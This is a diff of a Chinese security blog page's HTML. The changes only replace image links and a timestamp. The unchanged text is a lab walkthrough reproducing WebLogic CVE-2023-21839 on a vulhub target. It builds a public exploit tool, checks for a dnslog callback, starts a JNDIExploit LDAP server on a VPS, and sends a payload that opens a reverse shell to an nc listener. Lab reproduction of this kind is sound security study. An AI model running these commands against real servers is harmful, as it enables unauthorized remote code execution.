@@ -23,17 +23,17 @@
 <meta property="og:site_name" content="Ninja&#39;s blog">
 <meta property="og:description" content="影响版本 WebLogic_Server &#x3D; 12.2.1.3.0 WebLogic_Server &#x3D; 12.2.1.4.0 WebLogic_Server &#x3D; 14.1.1.0.0  实验环境 攻击机：Windows 靶机：vulhub靶场环境  漏洞复现1）启动靶场环境 1234进入靶场路径cd vulhub-master&#x2F;weblogic&#x2F;CVE-2023-21">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/image-1719813876445-7.png">
-<meta property="og:image" content="http://example.com/images/image-1-1719813873297-5.png">
-<meta property="og:image" content="http://example.com/images/image-3-1719813866954-3.png">
-<meta property="og:image" content="http://example.com/images/1681820668332.png">
-<meta property="og:image" content="http://example.com/images/1681820154917.png">
+<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/image-1719813876445-7.png">
+<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/image-1-1719813873297-5.png">
+<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/image-3-1719813866954-3.png">
+<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/1681820668332.png">
+<meta property="og:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/1681820154917.png">
 <meta property="article:published_time" content="2023-04-18T10:22:25.000Z">
-<meta property="article:modified_time" content="2024-07-01T07:45:30.299Z">
+<meta property="article:modified_time" content="2024-07-01T08:43:00.962Z">
 <meta property="article:author" content="Ninja">
 <meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/images/image-1719813876445-7.png">
+<meta name="twitter:image" content="https://gitee.com/gh0stninja/pic/raw/master/blog/image-1719813876445-7.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -316,16 +316,16 @@
 <p>2）访问weblogic后台</p>
 <figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>.<span class="hljs-keyword">x</span>:<span class="hljs-number">7001</span>/console/login/LoginForm.jsp<br></code></pre></td></tr></table></figure>
 
-<p><img src="/./images/image-1719813876445-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/image-1719813876445-7.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>3）下载工具：<a target="_blank" rel="noopener" href="https://github.com/4ra1n/CVE-2023-21839">https://github.com/4ra1n/CVE-2023-21839</a></p>
 <p>编译工具</p>
 <figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cd</span> cmd/<br><span class="hljs-keyword">go</span> build -<span class="hljs-keyword">o</span> CVE-<span class="hljs-number">2023</span>-<span class="hljs-number">21839</span>.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/./images/image-1-1719813873297-5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/image-1-1719813873297-5.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>4）检测dnslog回显</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2023</span>-<span class="hljs-number">21839</span>.exe -ip <span class="hljs-number">192.168.199.132</span> -port <span class="hljs-number">7001</span> -ldap ldap://m9ezsq.dnslog.cn/<br></code></pre></td></tr></table></figure>
 
-<p><img src="/./images/image-3-1719813866954-3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/image-3-1719813866954-3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>5）反弹shell</p>
 <p>先在vps服务器上开启ldap服务，使用Jndi反序列工具，监听11389端口</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">java</span> -jar JNDIExploit-<span class="hljs-number">1</span>.<span class="hljs-number">2</span>-SNAPSHOT.jar -i <span class="hljs-number">121</span>.<span class="hljs-number">4</span>.x.x -l <span class="hljs-number">11389</span> -p <span class="hljs-number">18080</span><br></code></pre></td></tr></table></figure>
@@ -333,9 +333,9 @@
 <p>然后nc开启监听18888端口</p>
 <figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">18888</span><br><span class="hljs-attribute">CVE</span>-<span class="hljs-number">2023</span>-<span class="hljs-number">21839</span>.exe -ip <span class="hljs-number">192.168.199.132</span> -port <span class="hljs-number">7001</span> -ldap ldap://<span class="hljs-number">121</span>.<span class="hljs-number">4</span>.x.x:<span class="hljs-number">11389</span>/Basic/ReverseShell/<span class="hljs-number">121</span>.<span class="hljs-number">4</span>.x.x/<span class="hljs-number">18888</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/./images/1681820668332.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/1681820668332.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>成功反弹shell</p>
-<p><img src="/./images/1681820154917.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><img src="https://gitee.com/gh0stninja/pic/raw/master/blog/1681820154917.png" srcset="/img/loading.gif" lazyload alt="img"></p>
 
                 
               </div>
